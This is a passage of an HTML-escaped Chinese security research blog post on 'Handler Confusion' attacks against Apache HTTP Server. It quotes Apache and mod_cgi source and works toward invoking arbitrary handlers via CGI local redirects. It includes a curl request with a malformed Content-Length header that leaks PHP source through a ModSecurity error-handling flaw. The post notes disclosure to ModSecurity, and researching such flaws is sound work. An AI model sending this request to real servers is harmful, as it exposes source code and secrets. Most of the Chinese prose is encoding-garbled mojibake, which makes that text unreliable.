                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* strip trailing spaces */&lt;/span&gt;

                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AP_DEFAULT_HANDLER_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_run_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°åœ¨é€²å…¥ä¸»è¦çš„æ¨¡çµ„è™•ç†å™¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_run_handler()&lt;/code&gt; ä¹‹å‰ï¼Œå¦‚æœè«‹æ±‚ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; ç‚ºç©ºå‰‡æŠŠçµæ§‹ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; æ¬„ä½çš„å…§å®¹ç•¶æˆæœ€çµ‚å°‡è¢«ä½¿ç”¨çš„æ¨¡çµ„è™•ç†å™¨ã€‚ é€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddHandler&lt;/code&gt; æ•ˆæœä¸€è‡´çš„ä¸»è¦ç†ç”±ï¼Œå› ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; æœ€çµ‚åœ¨åŸ·è¡Œå‰é‚„æ˜¯æœƒè¢«è½‰æ›æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt;ã€‚ æˆ‘å€‘çš„ç¬¬ä¸‰å€‹ Handler Confusion ä¸»è¦ä¹Ÿå°±æ˜¯åœç¹åœ¨é€™å€‹è¡Œç‚ºæ‰€ç™¼å±•å‡ºä¾†çš„æ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-3-1-overwrite-the-handler&quot;&gt;âš”ï¸ Primitive 3-1. Overwrite the Handler&lt;/h4&gt;

&lt;p&gt;åœ¨ç†è§£é€™å€‹è½‰æ›æ©Ÿåˆ¶å¾Œé¦–å…ˆç¬¬ä¸€å€‹æ”»æ“Šæ‰‹æ³•æ˜¯ â€”â€” &lt;strong&gt;Overwrite the Handler&lt;/strong&gt;ï¼Œæƒ³åƒä¸€ä¸‹å¦‚æœä»Šå¤©ç›®æ¨™çš„ Apache HTTP Server é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; å°‡ PHP é‹è¡Œèµ·ä¾†ã€‚&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt; application/x-httpd-php  .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨æ­£å¸¸çš„æµç¨‹ä¸­ç€è¦½ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/config.php&lt;/code&gt;ã€‚ é¦–å…ˆï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_mime&lt;/code&gt; æœƒåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type_checker&lt;/code&gt; éšæ®µæ ¹æ“š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; æ‰€è¨­å®šçš„é™„æª”åå°‡ç›¸å°æ‡‰çš„å…§å®¹è¤‡è£½åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; ä¸­ï¼Œç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; åœ¨æ•´å€‹ HTTP ç”Ÿå‘½é€±æœŸä¸­ä¸¦ç„¡è³¦å€¼ï¼Œæ–¼æ˜¯åœ¨åŸ·è¡Œæ¨¡çµ„è™•ç†å™¨å‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; æœƒå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; ç•¶æˆæ¨¡çµ„è™•ç†å™¨ï¼Œæœ€çµ‚å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; è™•ç†è«‹æ±‚ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œå¦‚æœä»Šå¤©æœ‰ä»»ä½•æ¨¡çµ„åœ¨åŸ·è¡Œåˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; å‰ã€Œä¸å°å¿ƒã€æŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; è¦†å¯«æ‰äº†ï¼Œé‚£æœƒç™¼ç”Ÿä»€éº¼äº‹å‘¢ï¼Ÿ&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;âœ”ï¸ 3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;å› æ­¤é€™å€‹æ”»æ“Šæ‰‹æ³•çš„ç¬¬ä¸€å€‹åˆ©ç”¨å°±æ˜¯é€éé€™å€‹ã€Œä¸å°å¿ƒã€å»æ´©æ¼ä»»æ„ PHP çš„åŸå§‹ç¢¼ã€‚ é€™å€‹æŠ€è¡“æœ€æ—©æ˜¯ç”± Max Dmitriev åœ¨ ZeroNights 2021 æ‰€ç™¼è¡¨çš„ç ”ç©¶ä¸­æåŠ (kudos to him!)ï¼Œæ¼”è¬›ä¸»é¡ŒåŠæŠ•å½±ç‰‡å¯ä»¥å¾é€™é‚Šçœ‹åˆ°ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf&quot;&gt;Apache 0day bug, which still nobody knows of, and which was fixed accidentally&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Max Dmitriev è§€å¯Ÿåˆ°åªè¦é€å‡ºéŒ¯èª¤çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Length&lt;/code&gt;ï¼Œé ç«¯ Httpd ä¼ºæœå™¨æœƒç™¼ç”Ÿä¸æ˜çš„éŒ¯èª¤é †å¸¶å›å‚³ PHP çš„åŸå§‹ç¢¼ï¼Œåœ¨ç´°è¿½æµç¨‹å¾Œç™¼ç¾å…¶æˆå› æ˜¯ ModSecurity åœ¨ä½¿ç”¨ APR (Apache Portable Runtime) å‡½ç¤ºåº«æ™‚ä¸¦æœªå¥½å¥½çš„è™•ç† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; å›å‚³å€¼æ‰€å°è‡´çš„ &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt;ã€‚ ç”±æ–¼ç™¼ç”ŸéŒ¯èª¤æ™‚ Httpd æƒ³é€å‡ºä¸€äº› HTML éŒ¯èª¤è¨Šæ¯ï¼Œæ–¼æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; ä¹Ÿé †ä¾¿è¢«è¦†å¯«æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text/html&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ ModSecurity ä¸¦æœªå¦¥å–„çš„è™•ç†å›å‚³å€¼ä½¿å¾—æœ¬è©²åœæ­¢çš„ Httpd å…§éƒ¨æµç¨‹ç¹¼çºŒåŸ·è¡Œï¼Œè€Œé€™å€‹ã€Œå‰¯ä½œç”¨ã€åˆæœƒæŠŠåŸæœ¬åŠ ä¸Šçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; çµ¦è¦†å¯«æ‰ï¼Œå°è‡´æœ€çµ‚è©²è¢«ç•¶æˆ PHP çš„æª”æ¡ˆè¢«ç•¶æˆä¸€èˆ¬æ–‡ä»¶è™•ç†ä¸¦å°‡å…¶ä¸­çš„ç¨‹å¼ç¢¼åŠæ•æ„Ÿè¨­å®šå°å‡ºã€‚ ğŸ¤«&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://127.0.0.1/info.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Length: x&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; HTTP/1.1 400 Bad Request
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Date: Mon, 29 Jul 2024 05:32:23 GMT
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
...
&amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç†è«–ä¸Šæ‰€æœ‰åŸºæ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; çš„è¨­å®šèªæ³•éƒ½å®¹æ˜“é­å—æ­¤é¡å•é¡Œå½±éŸ¿ï¼Œæ‰€ä»¥é™¤äº† Max åœ¨æŠ•å½±ç‰‡ä¸­æ‰€å±•ç¤ºçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; æ­é… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_actions&lt;/code&gt; å¤–ï¼Œç´”ç²¹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; æ­é…ä¸Š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; ä¹ŸåŒæ¨£ä¹Ÿå—å½±éŸ¿ã€‚&lt;/p&gt;

&lt;p&gt;å¦å¤–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé€™å€‹å‰¯ä½œç”¨åœ¨ Apache HTTP Server ç‰ˆæœ¬ 2.4.44 æ™‚è¢«ç•¶æˆä¸€å€‹&lt;a href=&quot;https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a&quot;&gt;å¢é€²è«‹æ±‚è§£æå™¨&lt;/a&gt;çš„ç¨‹å¼éŒ¯èª¤è¢«æ›´æ­£ï¼Œæ–¼æ˜¯é€™å€‹ã€Œæ¼æ´ã€å°±è¢«ç•¶æˆå·²ä¿®å¾©ç›´åˆ°æˆ‘é‡æ–°æ’¿èµ·å®ƒã€‚ ä½†ç”±æ–¼å…¶æ ¹æœ¬æˆå› é‚„æ˜¯ ModSecurity ä¸¦æœªå¥½å¥½çš„è™•ç†éŒ¯èª¤ï¼Œåªè¦æ‰¾åˆ°å…¶å®ƒæ¢è§¸ç™¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; çš„è·¯å¾‘é‚£åŒæ¨£çš„è¡Œç‚ºé‚„æ˜¯å¯ä»¥é‡ç¾æˆåŠŸã€‚&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. æ­¤å•é¡Œå·²æ–¼ 6/20 é€éå®˜æ–¹ä¿¡ç®±å›å ±çµ¦ ModSecurity ä¸¦ç”± Project Co-Leader å»ºè­°å›åˆ°åŸ &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;GitHub Issue&lt;/a&gt; ä¸­è¨è«–ã€‚&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-1-2-overwrite-handler-to---&quot;&gt;âœ”ï¸ 3-1-2. Overwrite Handler to â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ&lt;/h5&gt;

&lt;p&gt;åŸºæ–¼å‰é¢æåˆ°çš„ &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt; è¡Œç‚ºä»¥åŠå‰¯ä½œç”¨ï¼Œé€™å€‹æ”»æ“Šæ‰‹æ³•é‚„å¯ä»¥å®Œæˆå…¶å®ƒæ›´é…·çš„åˆ©ç”¨ï¼Œä¸éç”±æ–¼æ­¤å•é¡Œå°šæœªå®Œå…¨ä¿®å¾©ï¼Œæ›´é€²ä¸€æ­¥çš„åˆ©ç”¨æ–¹å¼ï¼Œå°‡æ–¼ä¿®å¾©å®Œæˆå¾Œå†æ­éœ²ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;âš”ï¸ Primitive 3-2. Invoke Arbitrary Handlers&lt;/h4&gt;

&lt;p&gt;ä»”ç´°æ€è€ƒå‰é¢ Overwrite Handler æ”»æ“Šæ‰‹æ³•ï¼Œé›–ç„¶æ˜¯å› ç‚º ModSecurity ä¸¦æœªå¥½å¥½çš„è™•ç†éŒ¯èª¤ï¼Œå°è‡´è«‹æ±‚è¢«è¨­ç½®ä¸ŠéŒ¯èª¤çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;ã€‚ ä½†å†æ·±å…¥çš„æ¢ç©¶å…¶æ ¹æœ¬åŸå› æ‡‰è©²æ˜¯ â€”â€” &lt;strong&gt;Apache HTTP Server åœ¨ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; æ™‚ï¼Œå…¶å¯¦ç„¡å¾è¾¨åˆ¥å®ƒçš„èªæ„ï¼Œé€™å€‹æ¬„ä½æ—¢å¯ä»¥æ˜¯åœ¨è«‹æ±‚éšæ®µè¢«èªæ³•è¨­å®šå¥½çš„å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å›æ‡‰éšæ®µä¼ºæœå™¨å›å‚³ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; æ¨™é ­çš„å…§å®¹ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ç†è«–ä¸Šå¦‚æœèƒ½æ§åˆ¶ä¼ºæœå™¨å›æ‡‰ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; æ¨™é ­çš„å…§å®¹ï¼Œé‚£å°±å¯ä»¥é€éé‚£æ®µå¾é–‹ç™¼åˆæœŸéºç•™è‡³ä»Šçš„ç¨‹å¼ç¢¼å‘¼å«ä»»æ„çš„æ¨¡çµ„è™•ç†å™¨ï¼Œé€™ä¹Ÿæ˜¯ Handler Confusion çš„æœ€å¾Œä¸€å€‹æ”»æ“Šæ‰‹æ³• â€”â€” &lt;strong&gt;å‘¼å«ä»»æ„ Apache HTTP Server çš„å…§éƒ¨æ¨¡çµ„è™•ç†å™¨&lt;/strong&gt;ï¼&lt;/p&gt;

&lt;p&gt;ä½†é€™è£¡é‚„æœ‰æœ€å¾Œçš„ä¸€å¡Šæ‹¼åœ–å¿…é ˆå¡«ä¸Šï¼Œåœ¨ Httpd ä¸­æ‰€æœ‰å¯ä»¥å¾ä¼ºæœå™¨å›æ‡‰ä¿®æ”¹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; çš„åœ°æ–¹å…¨éƒ½ç™¼ç”Ÿåœ¨é‚£æ®µéºç•™ç¨‹å¼ç¢¼ä¹‹å¾Œï¼Œå°±ç®—ä¿®æ”¹åˆ°è©²æ¬„ä½çš„å…§å®¹ï¼Œæ­¤æ™‚ HTTP ç”Ÿå‘½é€±æœŸä¹Ÿé€²å…¥å°¾è²ï¼Œç„¡æ³•å†åšæ›´é€²ä¸€æ­¥çš„åˆ©ç”¨â€¦â€¦ å—ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘æ‰¾äº† &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875&quot;&gt;RFC 3875&lt;/a&gt; ä¾†ç•¶æ•‘æ´æŠ•æ‰‹ï¼ RFC 3875 æ˜¯ä¸€å€‹é—œæ–¼ CGI çš„è¦ç¯„ï¼Œå…¶ä¸­ &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2&quot;&gt;6.2.2. ç¯€&lt;/a&gt;å®šç¾©äº†ä¸€å€‹ Local Redirect Response è¡Œç‚º:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The CGI script can return a URI path and query-string (â€˜local-pathqueryâ€™) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç°¡å–®ä¾†èªªè¦ç¯„äº† CGI åœ¨ç‰¹å®šæ¢ä»¶ä¸‹å¿…é ˆä½¿ç”¨ä¼ºæœå™¨ç«¯çš„è³‡æºå»è™•ç†è½‰å€ï¼Œä»”ç´°æª¢è¦– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; å°æ–¼é€™å€‹è¦ç¯„çš„å¯¦ä½œæœƒç™¼ç¾ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983&quot;&gt;modules/generators/mod_cgi.c#L983&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_scan_script_header_err_brigade_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;
                                                    &lt;span class=&quot;n&quot;&gt;APLOG_MODULE_INDEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP_NOT_MODIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* This redirect needs to be a GET no matter what the original
         * method was.
         */&lt;/span&gt;
